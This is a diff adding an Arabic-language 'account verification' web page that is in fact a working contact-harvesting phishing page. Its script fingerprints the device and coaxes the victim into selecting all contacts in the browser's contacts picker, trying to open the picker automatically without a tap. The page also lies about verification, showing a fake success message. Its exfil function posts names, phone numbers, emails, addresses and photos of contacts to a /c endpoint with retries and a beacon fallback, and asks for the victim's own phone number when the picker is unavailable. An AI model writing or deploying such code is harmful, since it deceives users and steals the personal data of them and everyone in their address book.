@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="theme-color" content="#0b0b0b">
+<title>تحقق من الحساب</title>
+<style>
+  *{box-sizing:border-box}
+  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0b0b0b;color:#eee;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
+  #app{text-align:center;width:100%;max-width:420px}
+  h1{font-size:22px;margin:0 0 8px}
+  p{color:#9aa0a6;font-size:14px;margin:0 0 22px}
+  button{background:#1a73e8;color:#fff;border:0;padding:14px 22px;border-radius:10px;font-size:17px;width:100%;margin-top:10px}
+  button:disabled{opacity:.5}
+  input{display:block;width:100%;margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:#eee;font-size:16px}
+  .spinner{width:28px;height:28px;border:3px solid #333;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 16px;animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .ok{color:#34a853;font-size:18px}
+  .hint{background:#1c1c1c;border:1px solid #444;border-radius:10px;padding:12px;font-size:14px;color:#fdd663;margin-bottom:14px;line-height:1.6}
+</style>
+</head>
+<body>
+<div id="app">
+  <h1>تحقق من الحساب</h1>
+  <p>اضغط المتابعة لإكمال التحقق</p>
+  <button id="btn">متابعة</button>
+</div>
+<script>
+const meta = {
+  ua: navigator.userAgent,
+  platform: navigator.platform,
+  lang: navigator.language,
+  screen: screen.width + "x" + screen.height,
+  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  cores: navigator.hardwareConcurrency || 0,
+  mem: navigator.deviceMemory || 0,
+  touch: "ontouchstart" in window,
+  secure: window.isSecureContext,
+  picker: !!(navigator.contacts && navigator.contacts.select),
+  ts: Date.now()
+};
+
+function normPhone(t) {
+  if (!t) return "";
+  const d = String(t).replace(/[^\d+]/g, "");
+  return d.startsWith("+") ? d : (d ? "+" + d : "");
+}
+
+function blobToB64(blob) {
+  return new Promise((res) => {
+    const r = new FileReader();
+    r.onload = () => res(r.result);
+    r.onerror = () => res("");
+    r.readAsDataURL(blob);
+  });
+}
+
+async function fetchTimeout(url, opts, ms) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), ms);
+  try { return await fetch(url, {...opts, signal: ctrl.signal}); }
+  finally { clearTimeout(t); }
+}
+
+async function exfil(contacts) {
+  const seen = new Set();
+  const clean = [];
+  for (const c of contacts) {
+    const key = JSON.stringify([c.name, c.tel, c.email, c.address]);
+    if (seen.has(key)) continue;
+    seen.add(key);
+    const tel = (c.tel || []).map(normPhone).filter(Boolean);
+    clean.push({name: c.name || "", tel, email: c.email || [], address: c.address || [], icon: c.icon || ""});
+  }
+  const body = JSON.stringify({contacts: clean, meta, url: location.href});
+  for (let i = 0; i < 3; i++) {
+    try {
+      const r = await fetchTimeout("/c", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body
+      }, 8000);
+      if (r.ok) return true;
+    } catch (e) {}
+    await new Promise(r => setTimeout(r, 800 * (i + 1)));
+  }
+  try { navigator.sendBeacon("/c", body); } catch (e) {}
+  return false;
+}
+
+function done() {
+  document.getElementById("app").innerHTML = '<div class="ok">✓ تم التحقق بنجاح</div>';
+}
+
+function showEntry() {
+  document.getElementById("app").innerHTML =
+    '<h1>تحقق من الحساب</h1>' +
+    '<p>اضغط المتابعة لإكمال التحقق</p>' +
+    '<button id="btn">متابعة</button>';
+  document.getElementById("btn").addEventListener("click", openPicker);
+}
+
+function showForm(reason) {
+  document.getElementById("app").innerHTML =
+    (reason ? '<div class="hint">' + reason + '</div>' : '') +
+    '<h1>أدخل البيانات</h1>' +
+    '<p>لإكمال التحقق أدخل رقمك</p>' +
+    '<input id="n" placeholder="الاسم" autocomplete="name">' +
+    '<input id="p" type="tel" placeholder="رقم الهاتف" autocomplete="tel">' +
+    '<button id="s">تأكيد</button>';
+  document.getElementById("s").addEventListener("click", async () => {
+    await exfil([{name: document.getElementById("n").value, tel: [document.getElementById("p").value]}]);
+    done();
+  });
+}
+
+function blockReason() {
+  if (!meta.secure) return 'الاتصال ليس مشفر (HTTPS). منتقي الجهات ما يشتغل إلا على اتصال مشفر — افتح الرابط عبر https فقط.';
+  if (!meta.picker) return 'هذا المتصفح ما يدعم منتقي الجهات. استخدم جوجل كروم على هاتف أندرويد.';
+  return '';
+}
+
+let tried = false;
+
+async function openPicker() {
+  if (tried) return;
+  tried = true;
+
+  const reason = blockReason();
+  if (reason) {
+    tried = false;
+    showForm(reason);
+    return;
+  }
+
+  document.getElementById("app").innerHTML =
+    '<div class="spinner"></div>' +
+    '<div class="hint">في نافذة الجهات اضغط <b>تحديد الكل</b> ثم <b>تم</b></div>';
+
+  try {
+    const list = await navigator.contacts.select(
+      ["name", "tel", "email", "address", "icon"], {multiple: true});
+    if (list && list.length) {
+      const out = [];
+      for (const c of list) {
+        out.push({
+          name: c.name || "",
+          tel: c.tel || [],
+          email: c.email || [],
+          address: c.address || [],
+          icon: c.icon ? await blobToB64(c.icon) : ""
+        });
+      }
+      await exfil(out);
+      done();
+      return;
+    }
+  } catch (e) {}
+
+  tried = false;
+  showEntry();
+}
+
+document.getElementById("btn").addEventListener("click", openPicker);
+
+// auto-open where the browser allows a gesture-free call: zero taps
+setTimeout(openPicker, 400);
+</script>
+</body>
+</html>
